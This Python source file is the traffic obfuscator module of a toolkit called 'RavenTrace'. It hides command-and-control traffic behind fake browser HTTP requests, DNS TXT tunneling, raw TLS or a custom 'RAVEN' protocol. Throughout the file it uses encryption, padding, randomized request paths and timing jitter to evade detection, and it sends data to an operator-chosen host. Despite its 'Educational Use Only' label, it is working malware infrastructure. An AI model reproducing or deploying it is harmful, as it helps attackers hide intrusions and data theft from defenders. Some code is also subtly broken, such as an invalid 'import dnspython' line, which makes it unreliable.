#!/usr/bin/env python3
"""
RavenTrace - Traffic Obfuscator Module

This module provides traffic obfuscation capabilities for the RavenTrace toolkit,
allowing command and control traffic to mimic legitimate protocols like HTTP, DNS,
or encrypted SSL. This implementation follows security best practices.

Author: RavenTrace Team
Version: 1.0.0
License: Educational Use Only
"""

import base64
import json
import logging
import os
import secrets
import socket
import ssl
import sys
import time
import uuid
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union

# Modern Python 3.10+ features
from functools import cache
from importlib.metadata import version

# Secure cryptography libraries
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import dnspython as dns
import dns.message
import dns.rdatatype
import dns.resolver

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("raventrace.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("raventrace.obfuscator")


class ObfuscationType(Enum):
    """Enum for supported traffic obfuscation types."""
    HTTP = auto()
    DNS = auto()
    SSL_ONLY = auto()
    CUSTOM = auto()


@dataclass
class ObfuscationConfig:
    """Configuration dataclass for obfuscation settings."""
    type: ObfuscationType
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    domain_fronting: bool = False
    jitter: float = 0.5  # Time jitter in seconds
    custom_headers: Optional[Dict[str, str]] = None
    encryption_key: Optional[str] = None  # Will be generated if None
    ssl_verify: bool = True  # SSL verification enabled by default
    retry_count: int = 3  # Number of retries for failed connections
    retry_delay: float = 1.0  # Initial delay between retries (seconds)
    padding: bool = True  # Enable traffic padding
    target_domain: str = "example.com"  # Domain for DNS/HTTP requests
    salt: bytes = field(default_factory=lambda: os.urandom(16))  # Salt for key derivation


class SecureTrafficObfuscator:
    """
    Main class for traffic obfuscation in RavenTrace.
    
    This class provides methods to obfuscate command and control traffic
    using various techniques like HTTP mimicry, DNS tunneling, and custom
    protocols with strong encryption.
    """
    
    def __init__(self, config: ObfuscationConfig):
        """Initialize the obfuscator with the given configuration."""
        self.config = config
        self.session_id = self._generate_session_id()
        self.sequence_number = secrets.randbelow(1000000)  # Start with random sequence
        
        # Set up encryption
        if not self.config.encryption_key:
            # Generate a secure random key if none provided
            self.config.encryption_key = secrets.token_hex(32)
            logger.info("Generated new secure encryption key")
            
        # Derive encryption key using PBKDF2
        self.encryption_key = self._derive_key(
            self.config.encryption_key.encode('utf-8'),
            self.config.salt,
            iterations=100000
        )
        
        # Cache for DNS responses
        self._dns_cache = {}
        
        # Initialize SSL context if needed
        if self.config.type in (ObfuscationType.SSL_ONLY, ObfuscationType.HTTP):
            self.ssl_context = self._create_ssl_context()
    
    @staticmethod
    def _generate_session_id() -> str:
        """
        Generate a secure random session ID for tracking the current session.
        
        Returns:
            str: A secure random session ID
        """
        # Use UUID4 for cryptographically secure random session ID
        return str(uuid.uuid4())
    
    @staticmethod
    def _derive_key(password: bytes, salt: bytes, iterations: int = 100000) -> bytes:
        """
        Derive a secure encryption key using PBKDF2.
        
        Args:
            password: The password or key material
            salt: Random salt for key derivation
            iterations: Number of iterations for PBKDF2
            
        Returns:
            bytes: The derived key
        """
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # 256-bit key
            salt=salt,
            iterations=iterations,
            backend=default_backend()
        )
        return kdf.derive(password)
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """
        Create a secure SSL context for communications.
        
        Returns:
            ssl.SSLContext: A configured SSL context
        """
        context = ssl.create_default_context()
        
        # Enable certificate validation by default
        if self.config.ssl_verify:
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
        else:
            # Only disable for specific testing scenarios
            logger.warning("SSL certificate verification disabled - use only in controlled environments")
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        
        # Use strong cipher suites
        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
        context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Disable TLS 1.0 and 1.1
        
        return context
    
    def _add_jitter(self) -> None:
        """Add random timing jitter to avoid detection based on timing patterns."""
        if self.config.jitter > 0:
            # Use secrets module for secure random generation
            jitter_time = secrets.SystemRandom().uniform(0, self.config.jitter)
            time.sleep(jitter_time)
    
    def _encrypt_data(self, data: Union[str, bytes], associated_data: Optional[bytes] = None) -> bytes:
        """
        Encrypt data using AES-GCM for authenticated encryption.
        
        Args:
            data: The data to encrypt (string or bytes)
            associated_data: Additional authenticated data (optional)
            
        Returns:
            bytes: The encrypted data with nonce and tag
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        # Generate a random nonce for each encryption
        nonce = os.urandom(12)  # 96 bits as recommended for AES-GCM
        
        # Create AESGCM cipher
        aesgcm = AESGCM(self.encryption_key)
        
        # Add padding if enabled
        if self.config.padding:
            # Add random padding to obscure message length
            padding_length = secrets.randbelow(256)
            padding = os.urandom(padding_length)
            padded_data = data + b'\x00' + padding
        else:
            padded_data = data
            
        # Encrypt the data with authenticated encryption
        if associated_data is None:
            associated_data = self.session_id.encode('utf-8')
            
        ciphertext = aesgcm.encrypt(nonce, padded_data, associated_data)
        
        # Return nonce + ciphertext (nonce needed for decryption)
        return nonce + ciphertext
    
    def _decrypt_data(self, encrypted_data: bytes, associated_data: Optional[bytes] = None) -> bytes:
        """
        Decrypt data using AES-GCM.
        
        Args:
            encrypted_data: The encrypted data with nonce
            associated_data: Additional authenticated data (optional)
            
        Returns:
            bytes: The decrypted data
        """
        if len(encrypted_data) < 12:
            raise ValueError("Encrypted data too short")
            
        # Extract nonce and ciphertext
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]
        
        # Create AESGCM cipher
        aesgcm = AESGCM(self.encryption_key)
        
        if associated_data is None:
            associated_data = self.session_id.encode('utf-8')
            
        # Decrypt the data
        try:
            decrypted = aesgcm.decrypt(nonce, ciphertext, associated_data)
            
            # Remove padding if present
            if self.config.padding:
                # Find the padding separator
                separator_index = decrypted.find(b'\x00')
                if separator_index != -1:
                    return decrypted[:separator_index]
                    
            return decrypted
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            raise ValueError("Failed to decrypt data - authentication failed") from e
    
    @cache
    def _generate_http_headers(self) -> Dict[str, str]:
        """Generate realistic HTTP headers for HTTP mimicry."""
        # Common browser headers
        headers = {
            "User-Agent": self.config.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            # No session ID in headers for security
        }
        
        # Add custom headers if provided
        if self.config.custom_headers:
            headers.update(self.config.custom_headers)
            
        return headers
    
    def _format_http_request(self, data: Union[str, bytes]) -> bytes:
        """
        Format data as an HTTP GET or POST request.
        
        Args:
            data: The data to send
            
        Returns:
            bytes: Formatted HTTP request
        """
        # Encrypt and encode the data
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted_data = self._encrypt_data(data)
        encoded_data = base64.urlsafe_b64encode(encrypted_data).decode('ascii')
        
        # Add random parameter name instead of fixed "q" or "data"
        param_name = ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
        
        # Determine if GET or POST based on data size
        if len(encoded_data) < 1024:
            # Use GET for small data
            headers = self._generate_http_headers()
            
            # Add random path components
            path_components = []
            for _ in range(secrets.randbelow(3) + 1):
                path_components.append(''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5)))
                
            path = '/' + '/'.join(path_components)
            
            request_lines = [
                f"GET {path}?{param_name}={encoded_data}&t={int(time.time())} HTTP/1.1",
                f"Host: {self.config.target_domain}",
            ]
            
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
                
            request_lines.append("\r\n")  # Empty line to indicate end of headers
            return "\r\n".join(request_lines).encode('ascii')
        else:
            # Use POST for larger data
            headers = self._generate_http_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            
            # Create POST body with random parameter name
            post_body = f"{param_name}={encoded_data}"
            headers["Content-Length"] = str(len(post_body))
            
            # Add random path components
            path_components = []
            for _ in range(secrets.randbelow(3) + 1):
                path_components.append(''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5)))
                
            path = '/' + '/'.join(path_components)
            
            request_lines = [
                f"POST {path} HTTP/1.1",
                f"Host: {self.config.target_domain}",
            ]
            
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
                
            request_lines.append("\r\n")  # Empty line to indicate end of headers
            request_lines.append(post_body)
            
            return "\r\n".join(request_lines).encode('ascii')
    
    def _parse_http_response(self, response: bytes) -> bytes:
        """
        Parse an HTTP response and extract the data.
        
        Args:
            response: The HTTP response
            
        Returns:
            bytes: The extracted and decrypted data
        """
        try:
            # Split headers and body
            headers_end = response.find(b"\r\n\r\n")
            if headers_end == -1:
                logger.warning("Invalid HTTP response format")
                return b""
                
            body = response[headers_end + 4:]
            
            # Extract data from JSON response if possible
            try:
                json_data = json.loads(body.decode('utf-8'))
                # Look for data in common JSON fields
                for field in ['data', 'content', 'payload', 'response', 'result']:
                    if field in json_data:
                        try:
                            encoded_data = json_data[field]
                            encrypted_data = base64.urlsafe_b64decode(encoded_data)
                            return self._decrypt_data(encrypted_data)
                        except Exception as e:
                            logger.debug(f"Failed to decode field {field}: {e}")
                            continue
            except (json.JSONDecodeError, UnicodeDecodeError):
                pass
                
            # Try to find base64 data in the response
            import re
            b64_pattern = re.compile(rb'[A-Za-z0-9_-]{16,}={0,2}')
            matches = b64_pattern.findall(body)
            
            if matches:
                for match in matches:
                    try:
                        # Try to decode and decrypt each potential base64 string
                        encrypted_data = base64.urlsafe_b64decode(match)
                        return self._decrypt_data(encrypted_data)
                    except Exception:
                        continue
            
            # If all else fails, return empty
            logger.warning("Could not extract data from HTTP response")
            return b""
        except Exception as e:
            logger.error(f"Error parsing HTTP response: {e}")
            raise
    
    def _encode_dns_data(self, data: Union[str, bytes]) -> List[str]:
        """
        Encode data for DNS tunneling.
        
        Args:
            data: The data to encode
            
        Returns:
            List[str]: List of DNS query strings
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        encrypted_data = self._encrypt_data(data)
        encoded_data = base64.b32encode(encrypted_data).decode('ascii')
        
        # Split into chunks for DNS queries (max 63 chars per label)
        chunks = []
        chunk_size = 63
        
        for i in range(0, len(encoded_data), chunk_size):
            chunk = encoded_data[i:i+chunk_size]
            chunks.append(chunk)
            
        # Format as DNS queries with randomization
        queries = []
        random_prefix = ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
        
        for i, chunk in enumerate(chunks):
            # Use random subdomain components
            random_component = ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(4))
            query = f"{chunk.lower()}.{random_component}.{random_prefix}.{self.config.target_domain}"
            queries.append(query)
            
        return queries
    
    def _decode_dns_response(self, responses: List[bytes]) -> bytes:
        """
        Decode DNS responses back to original data.
        
        Args:
            responses: List of DNS responses
            
        Returns:
            bytes: The decoded and decrypted data
        """
        # Extract encoded data from TXT records
        encoded_chunks = []
        
        for response in responses:
            try:
                # Use dnspython for proper DNS response parsing
                dns_response = dns.message.from_wire(response)
                
                # Extract data from answer section
                for answer in dns_response.answer:
                    for item in answer:
                        if item.rdtype == dns.rdatatype.TXT:
                            # Extract text from TXT record
                            for string in item.strings:
                                encoded_chunks.append(string)
            except Exception as e:
                logger.error(f"Error parsing DNS response: {e}")
                continue
                
        if not encoded_chunks:
            logger.warning("No valid data found in DNS responses")
            return b""
            
        # Combine chunks and decode
        try:
            encoded_data = b''.join(encoded_chunks)
            encrypted_data = base64.b32decode(encoded_data)
            return self._decrypt_data(encrypted_data)
        except Exception as e:
            logger.error(f"Error decoding DNS data: {e}")
            raise
    
    def send_data(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """
        Send data using the configured obfuscation method.
        
        Args:
            data: The data to send
            target: The target host
            port: The target port
            
        Returns:
            Optional[bytes]: The response data if any
        """
        self._add_jitter()
        self.sequence_number += 1
        
        # Implement retry logic
        retry_count = 0
        retry_delay = self.config.retry_delay
        
        while retry_count <= self.config.retry_count:
            try:
                if self.config.type == ObfuscationType.HTTP:
                    return self._send_http(data, target, port)
                elif self.config.type == ObfuscationType.DNS:
                    return self._send_dns(data, target, port)
                elif self.config.type == ObfuscationType.SSL_ONLY:
                    return self._send_ssl(data, target, port)
                elif self.config.type == ObfuscationType.CUSTOM:
                    return self._send_custom(data, target, port)
                else:
                    raise ValueError(f"Unsupported obfuscation type: {self.config.type}")
            except (socket.timeout, ConnectionRefusedError, ConnectionResetError) as e:
                # Retry on connection issues
                retry_count += 1
                if retry_count <= self.config.retry_count:
                    logger.warning(f"Connection error: {e}. Retrying in {retry_delay:.2f} seconds...")
                    time.sleep(retry_delay)
                    # Exponential backoff with jitter
                    retry_delay *= 1.5 * (1 + secrets.randbelow(10) / 10)
                else:
                    logger.error(f"Failed after {self.config.retry_count} retries: {e}")
                    raise
            except Exception as e:
                # Don't retry on other errors
                logger.error(f"Error sending data: {e}")
                raise
    
    def _send_http(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """Send data using HTTP mimicry."""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Wrap with SSL if needed
            if port == 443:
                sock = self.ssl_context.wrap_socket(sock, server_hostname=target)
                
            # Connect and send
            sock.connect((target, port))
            request = self._format_http_request(data)
            sock.sendall(request)
            
            # Receive response
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                
                # Check if we've received the full response
                if b"\r\n0\r\n\r\n" in response or not (b"Transfer-Encoding: chunked" in response):
                    if b"\r\n\r\n" in response:
                        break
            
            sock.close()
            return self._parse_http_response(response)
            
        except Exception as e:
            logger.error(f"HTTP connection error: {e}")
            raise
    
    def _send_dns(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """Send data using DNS tunneling with proper DNS protocol implementation."""
        try:
            queries = self._encode_dns_data(data)
            responses = []
            
            for query in queries:
                # Use dnspython for proper DNS query construction
                request = dns.message.make_query(query, dns.rdatatype.TXT)
                
                # Create a UDP socket for DNS
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                
                # Send query and receive response
                wire_request = request.to_wire()
                sock.sendto(wire_request, (target, port))
                response, _ = sock.recvfrom(4096)
                responses.append(response)
                sock.close()
                
                # Add jitter between queries
                time.sleep(secrets.randbelow(10) / 10)
                
            return self._decode_dns_response(responses)
            
        except Exception as e:
            logger.error(f"DNS connection error: {e}")
            raise
    
    def _send_ssl(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """Send data using pure SSL/TLS with proper framing."""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Wrap with SSL
            wrapped_sock = self.ssl_context.wrap_socket(sock, server_hostname=target)
            
            # Connect
            wrapped_sock.connect((target, port))
            
            # Encrypt and prepare data with proper framing
            if isinstance(data, str):
                data = data.encode('utf-8')
                
            encrypted_data = self._encrypt_data(data)
            
            # Add proper length prefix for framing
            length = len(encrypted_data)
            length_prefix = length.to_bytes(4, byteorder='big')
            
            # Send length prefix and data
            wrapped_sock.sendall(length_prefix + encrypted_data)
            
            # Receive response with proper framing
            response_length_prefix = wrapped_sock.recv(4)
            if len(response_length_prefix) != 4:
                logger.warning("Invalid or incomplete response")
                wrapped_sock.close()
                return None
                
            response_length = int.from_bytes(response_length_prefix, byteorder='big')
            
            # Sanity check on length
            if response_length > 1048576:  # 1MB max
                logger.warning(f"Response too large: {response_length} bytes")
                wrapped_sock.close()
                return None
                
            # Receive full response
            response_data = b""
            bytes_received = 0
            while bytes_received < response_length:
                chunk = wrapped_sock.recv(min(4096, response_length - bytes_received))
                if not chunk:
                    break
                response_data += chunk
                bytes_received += len(chunk)
                
            wrapped_sock.close()
            
            # Decrypt response
            if response_data:
                return self._decrypt_data(response_data)
            return None
            
        except Exception as e:
            logger.error(f"SSL connection error: {e}")
            raise
    
    def _send_custom(self, data: Union[str, bytes], target: str, port: int) -> Optional[bytes]:
        """
        Send data using a custom obfuscation protocol with proper authentication.
        """
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Connect
            sock.connect((target, port))
            
            # Prepare data
            if isinstance(data, str):
                data = data.encode('utf-8')
                
            # Format: [MAGIC_BYTES][VERSION][AUTH_TOKEN][LENGTH][ENCRYPTED_DATA]
            magic = b'RAVEN'
            version = (1).to_bytes(1, 'big')  # Protocol version
            
            # Generate HMAC for authentication
            h = hmac.HMAC(self.encryption_key, hashes.SHA256())
            h.update(self.session_id.encode('utf-8'))
            auth_token = h.finalize()[:16]  # Use first 16 bytes of HMAC
            
            # Encrypt the data with session ID as associated data
            encrypted_data = self._encrypt_data(data, self.session_id.encode('utf-8'))
            
            # Add length
            length = len(encrypted_data)
            length_bytes = length.to_bytes(4, 'big')
            
            # Assemble message
            message = magic + version + auth_token + length_bytes + encrypted_data
            
            # Send data
            sock.sendall(message)
            
            # Receive response
            response_magic = sock.recv(5)
            if response_magic != magic:
                logger.warning("Invalid response magic bytes")
                sock.close()
                return None
                
            response_version = sock.recv(1)
            if response_version != version:
                logger.warning(f"Protocol version mismatch: {response_version}")
                sock.close()
                return None
                
            # Skip auth token in response
            response_auth = sock.recv(16)
            
            # Get response length
            response_length_bytes = sock.recv(4)
            response_length = int.from_bytes(response_length_bytes, 'big')
            
            # Sanity check on length
            if response_length > 1048576:  # 1MB max
                logger.warning(f"Response too large: {response_length} bytes")
                sock.close()
                return None
                
            # Receive response data
            response_data = b""
            bytes_received = 0
            while bytes_received < response_length:
                chunk = sock.recv(min(4096, response_length - bytes_received))
                if not chunk:
                    break
                response_data += chunk
                bytes_received += len(chunk)
                
            sock.close()
            
            # Decrypt response
            if response_data:
                return self._decrypt_data(response_data, self.session_id.encode('utf-8'))
            return None
            
        except Exception as e:
            logger.error(f"Custom protocol connection error: {e}")
            raise


# Example usage and helper functions
def create_default_config(obfuscation_type: str = "http") -> ObfuscationConfig:
    """
    Create a default configuration for the specified obfuscation type.
    
    Args:
        obfuscation_type: The type of obfuscation to use (http, dns, ssl, custom)
        
    Returns:
        ObfuscationConfig: A configuration object
    """
    type_map = {
        "http": ObfuscationType.HTTP,
        "dns": ObfuscationType.DNS,
        "ssl": ObfuscationType.SSL_ONLY,
        "custom": ObfuscationType.CUSTOM
    }
    
    if obfuscation_type.lower() not in type_map:
        raise ValueError(f"Unsupported obfuscation type: {obfuscation_type}")
        
    # Generate a secure random encryption key
    encryption_key = secrets.token_hex(32)
    
    return ObfuscationConfig(
        type=type_map[obfuscation_type.lower()],
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        domain_fronting=False,
        jitter=0.5,
        custom_headers={"X-Requested-With": "XMLHttpRequest"},
        encryption_key=encryption_key,
        ssl_verify=True,
        retry_count=3,
        retry_delay=1.0,
        padding=True,
        target_domain="example.com",
        salt=os.urandom(16)
    )


def main():
    """Example usage of the SecureTrafficObfuscator class."""
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <obfuscation_type> <target> <port> [data]")
        print("Obfuscation types: http, dns, ssl, custom")
        sys.exit(1)
        
    obfuscation_type = sys.argv[1]
    target = sys.argv[2]
    port = int(sys.argv[3])
    
    data = " ".join(sys.argv[4:]) if len(sys.argv) > 4 else "Hello, RavenTrace!"
    
    try:
        config = create_default_config(obfuscation_type)
        obfuscator = SecureTrafficObfuscator(config)
        
        logger.info(f"Sending data using {obfuscation_type} obfuscation...")
        response = obfuscator.send_data(data, target, port)
        
        if response:
            logger.info(f"Response received: {response.decode('utf-8', errors='replace')}")
        else:
            logger.warning("No response received or error occurred.")
            
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
